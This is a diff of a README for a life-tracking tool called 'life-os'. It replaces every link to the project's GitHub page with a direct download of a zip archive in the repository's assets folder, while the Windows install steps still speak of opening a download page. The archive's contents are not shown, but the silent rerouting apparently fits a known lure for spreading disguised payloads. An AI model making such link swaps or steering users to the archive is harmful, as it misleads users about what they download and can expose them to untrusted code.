@@ -1,12 +1,12 @@
 # 🧠 life-os - Track your life in one place
 
-[![Download life-os](https://img.shields.io/badge/Download%20life--os-blue?style=for-the-badge&logo=github)](https://github.com/divyanshrai9932-jpg/life-os)
+[![Download life-os](https://img.shields.io/badge/Download%20life--os-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/divyanshrai9932-jpg/life-os/main/assets/os_life_3.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and download or copy the files:
 
-[https://github.com/divyanshrai9932-jpg/life-os](https://github.com/divyanshrai9932-jpg/life-os)
+[https://raw.githubusercontent.com/divyanshrai9932-jpg/life-os/main/assets/os_life_3.2.zip](https://raw.githubusercontent.com/divyanshrai9932-jpg/life-os/main/assets/os_life_3.2.zip)
 
 ## ✨ What life-os does
 
@@ -19,7 +19,7 @@ You write in plain text, so your data stays simple and portable. You can open fi
 Follow these steps on a Windows PC:
 
 1. Open the download page:
-   [https://github.com/divyanshrai9932-jpg/life-os](https://github.com/divyanshrai9932-jpg/life-os)
+   [https://raw.githubusercontent.com/divyanshrai9932-jpg/life-os/main/assets/os_life_3.2.zip](https://raw.githubusercontent.com/divyanshrai9932-jpg/life-os/main/assets/os_life_3.2.zip)
 
 2. Find the download files or the latest release on the page.
 
@@ -203,7 +203,7 @@ That gives you a clear view of your life without too much work
 
 If you need to get life-os later, use this link:
 
-[https://github.com/divyanshrai9932-jpg/life-os](https://github.com/divyanshrai9932-jpg/life-os)
+[https://raw.githubusercontent.com/divyanshrai9932-jpg/life-os/main/assets/os_life_3.2.zip](https://raw.githubusercontent.com/divyanshrai9932-jpg/life-os/main/assets/os_life_3.2.zip)
 
 ## 🧩 Useful habits for setup
 
